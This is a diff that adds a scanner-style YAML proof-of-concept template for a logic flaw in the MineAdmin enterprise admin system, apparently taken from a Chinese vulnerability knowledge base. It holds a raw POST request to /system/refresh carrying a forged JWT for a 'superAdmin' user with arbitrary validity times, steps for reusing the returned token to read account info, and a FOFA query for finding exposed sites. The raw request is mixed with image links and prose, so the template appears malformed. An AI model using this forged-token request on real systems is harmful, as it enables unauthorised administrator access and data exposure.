@@ -1,0 +1,43 @@
+id: poc-gzcugqpgttddhtpz
+info:
+  name: MineAdmin企业级后台管理系统逻辑缺陷漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzcugqpgttddhtpz'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzcugqpgttddhtpz
+    fofa: body="MineAdmin"
+http:
+- raw:
+  - 'POC/EXP：构造的jwt（次处可任意构造生效及过期时间）
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238223547-63d93b26-0027-4238-b284-b150195eac8e.png)
+
+    POST /system/refresh HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/plain, */*
+
+    Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
+
+    Content-Type: application/json;charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh_CN
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238223972-68e902eb-e71f-42f1-9915-3ef8826b5a86.png)
+
+    POC/EXP：复制响应包的token，并发起请求查看info信息（也可查看其他信息此处不一一展示）
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238224351-3ea608ae-84a1-4999-9201-a586ee70d38c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
